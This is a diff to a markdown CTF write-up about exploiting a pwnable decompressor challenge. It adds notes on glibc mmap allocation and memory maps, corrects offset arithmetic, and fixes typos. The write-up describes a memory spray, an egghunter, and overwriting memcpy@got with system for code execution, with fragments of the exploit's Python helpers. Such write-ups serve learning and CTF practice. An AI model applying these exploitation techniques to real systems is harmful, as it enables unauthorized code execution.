@@ -22,7 +22,7 @@ I couldn't help him, but I took a look at pwnable challenges, and figured it wou
 
 On linux, you can inspect the mappings of a process given its pid through [procfs](https://www.kernel.org/doc/Documentation/filesystems/proc.txt), by reading the file `/proc/<pid>/maps`.
 
-If you are a process and you want to know your own memory mappings, you can read `/proc/<pid>/maps`.
+If you are a process and you want to know your own memory mappings, you can read `/proc/self/maps`.
 
 For example, you can try to read `/proc/self/maps` with `cat`:
 
@@ -133,6 +133,16 @@ int main()
     return 0;
 }
 ```
+
+
+### Note about glibc memory allocation
+
+From [man malloc](https://man7.org/linux/man-pages/man3/realloc.3.html) notes:
+- Normally, malloc() allocates memory from the heap, and adjusts the size of the heap as required, using sbrk(2). When allocating blocks of memory larger than MMAP_THRESHOLD bytes, the glibc malloc() implementation allocates the memory as a private anonymous mapping using mmap(2). MMAP_THRESHOLD is 128 kB by default, but is adjustable using mallopt(3). Allocations performed using mmap(2) are unaffected by the RLIMIT_DATA resource limit (see getrlimit(2)).
+
+So `void *mem = malloc(size)` will end up calling `mmap(size + malloc_metadata_size, ...)`
+
+Since libraries are mapped into the process through mmap by `ld`, those allocations will end up near the libraries.
 
 ### Boundary cross trick
 If you look at the addresses returned by malloc you can better understand what is happening. Protip: look at the most significant bytes.
@@ -319,8 +329,8 @@ which:
 int decompress(const char *fname)
 ```
 
-* Map the input file to the address `0x42069000000`.
-* Map the output file to the address `0x13371337000`.
+* Maps the input file to the address `0x42069000000`.
+* Maps the output file to the address `0x13371337000`.
 * Calls do_decompress() which gets the decompression done.
 
 The file is expected to be in the format:
@@ -365,11 +375,19 @@ This VM has 4 opcodes:
   ```py
   M64 = (1<<64) # Maximum 64bit value
   def get_off(out: int, target: int):
-    return (target-out)
-
+    return (target-out) % M64
+  
   # We are at 0xffffffff, what can we add to reach 0?
   print ('{:#x}'.format(get_off(0xffffffff, 0)))
-  # Result = 0xffffffff00000000
+  # Result = 0xffffffff00000001
+
+  # That's the same as doing this
+  M64 = (1<<64)-1 # Maximum 64bit value
+  def get_off(out: int, target: int):
+    return (target-out) & M64
+  
+  print ('{:#x}'.format(get_off(0xffffffff, 0)))
+
   ```
 
   Opcode implementation:
@@ -429,13 +447,12 @@ class CompressedFile():
 
         self.content += b'\x01' + b
         self.cur += 2
-        self.out += 1 & M64
+        self.out += 1
 
     def seek(self, off):
         self.content += b'\x02'
         self.content += p64(off)
         self.cur += 9
-        self.out += off & M64
 
     def memcpy(self, off, count):
         # memcpy(out, out-off, count);
@@ -443,7 +460,6 @@ class CompressedFile():
         self.content += p64(off)
         self.content += p64(count)
         self.cur += 17
-        self.out += count & M64
 ```
 
 # 4. Interacting with the binary
@@ -564,8 +580,7 @@ the result memory mappings will be something like this:
 ### Memory Spray result
 ```
 root@088ec31b2ce9:/home/ctf/challenge# cat /proc/`pgrep flag_server-exe`/maps
-...
-
+... My spray: ...
 7fe2dc000000-7fe2e0000000 r--p 00000000 00:af 121                        /challenge/files/59.unkyle
 7fe2e0000000-7fe2e4000000 r--p 00000000 00:af 119                        /challenge/files/58.unkyle
 7fe2e4000000-7fe2e8000000 r--p 00000000 00:af 117                        /challenge/files/57.unkyle
@@ -630,6 +645,20 @@ root@088ec31b2ce9:/home/ctf/challenge# cat /proc/`pgrep flag_server-exe`/maps
 7fe3cc000000-7fe3d0000000 r--p 00000000 00:af 3                          /challenge/files/0.unkyle
 7fe3d0000000-7fe3d01a8000 rw-p 00000000 00:00 0
 7fe3d01a8000-7fe3d4000000 ---p 00000000 00:00 0
+
+... Libraries: ...
+
+7fe3d6a1e000-7fe3d6a1f000 r--p 00000000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a1f000-7fe3d6a20000 r-xp 00001000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a20000-7fe3d6a21000 r--p 00002000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a21000-7fe3d6a22000 r--p 00002000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a22000-7fe3d6a23000 rw-p 00003000 fe:01 1445947                    /challenge/libkylezip.so
+7fe3d6a23000-7fe3d6a25000 rw-p 00000000 00:00 0
+7fe3d6a25000-7fe3d6a26000 r--p 00000000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a26000-7fe3d6a4d000 r-xp 00001000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a4d000-7fe3d6a57000 r--p 00028000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a57000-7fe3d6a59000 r--p 00031000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
+7fe3d6a59000-7fe3d6a5b000 rw-p 00033000 fe:01 2761539                    /lib/x86_64-linux-gnu/ld-2.33.so
 
 ...
 
@@ -759,7 +788,7 @@ def linearFindLargest(base, increment, idstart):
             print ('Yes')
             return i*increment
         print ('No')
-    raise Exception("find_largest should not fail")
+    raise Exception("linearFindLargest should not fail")
   
 # Find upper bound, we can't do a binary search because there are some holes which
 # screw things up
@@ -776,10 +805,10 @@ print (f"{lastMappedPage = :#x}")
 
 Finally, we know everything we need about the memory mappings, now it is just a matter of leveraging a write what where primitive into code execution.
 
-To achieve code execution I overwrote libkayle.so's memcpy@got entry with system@libc.
+To achieve code execution I overwrote libkyle.so's memcpy@got entry with system@libc.
 
-### Get libkayle base
-Luckily for us libc base and libkayle.so base are at a constant offset from the lastMappedPage, I didn't know that was the case so I wrote a egghunter which search for `\x7fELF` \(Header of ELF executables\), which in the end wasn't useful.
+### Get libkyle base
+Luckily for us libc base and libkyle.so base are at a constant offset from the lastMappedPage, I didn't know that was the case so I wrote a egghunter which search for `\x7fELF` \(Header of ELF executables\), which in the end wasn't useful.
 ```py
     # Scan backwards looking for b'\x7fELF'
     i = 0
@@ -800,7 +829,7 @@ Luckily for us libc base and libkayle.so base are at a constant offset from the 
         i += 1
 ```
 
-### Overwrite libkayle's memcpy@got and get RCE
+### Overwrite libkyle's memcpy@got and get RCE
 
 Fortunately overwriting memcpy@got with system was good enough to get the flag and claim that juicy bounty :)
 
